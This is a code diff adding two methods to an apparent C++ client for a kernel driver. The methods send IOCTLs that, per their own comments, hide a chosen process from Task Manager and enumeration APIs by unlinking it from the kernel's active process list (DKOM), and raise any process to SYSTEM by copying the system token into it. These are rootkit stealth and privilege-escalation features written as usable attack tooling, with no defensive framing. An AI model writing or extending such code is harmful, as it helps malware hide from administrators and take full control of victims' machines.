@@ -334,6 +334,81 @@ public:
 		return static_cast< std::uintptr_t >( response.BaseAddress );
 	}
 
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Hides a process from Task Manager by unlinking its EPROCESS from
+	///          the ActiveProcessLinks list (DKOM). The process continues to run
+	///          but is invisible to process enumeration APIs.</summary>
+	///
+	/// <param name="pid">The process ID to hide. If 0, uses the currently attached PID.</param>
+	///
+	/// <returns>True if the process was successfully hidden, false otherwise.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] bool hide_process( DWORD pid = 0 )
+	{
+		if( !this->is_connected() )
+			return false;
+
+		if( pid == 0 )
+			pid = this->m_pid;
+
+		HIDE_PROCESS_REQUEST request = {};
+		request.ProcessId = static_cast< ULONG64 >( pid );
+
+		HIDE_PROCESS_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			this->m_handle,
+			IOCTL_HIDE_PROCESS,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		return success && response.Status == 0;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Elevates a process to NT AUTHORITY\SYSTEM by copying the system
+	///          token into the target process's EPROCESS Token field.</summary>
+	///
+	/// <param name="pid">The process ID to elevate. If 0, uses the currently attached PID.</param>
+	///
+	/// <returns>True if the token was successfully replaced, false otherwise.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] bool elevate_token( DWORD pid = 0 )
+	{
+		if( !this->is_connected() )
+			return false;
+
+		if( pid == 0 )
+			pid = this->m_pid;
+
+		ELEVATE_TOKEN_REQUEST request = {};
+		request.ProcessId = static_cast< ULONG64 >( pid );
+
+		ELEVATE_TOKEN_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			this->m_handle,
+			IOCTL_ELEVATE_TOKEN,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		return success && response.Status == 0;
+	}
+
 private:
 	HANDLE m_handle;
 	DWORD  m_pid;
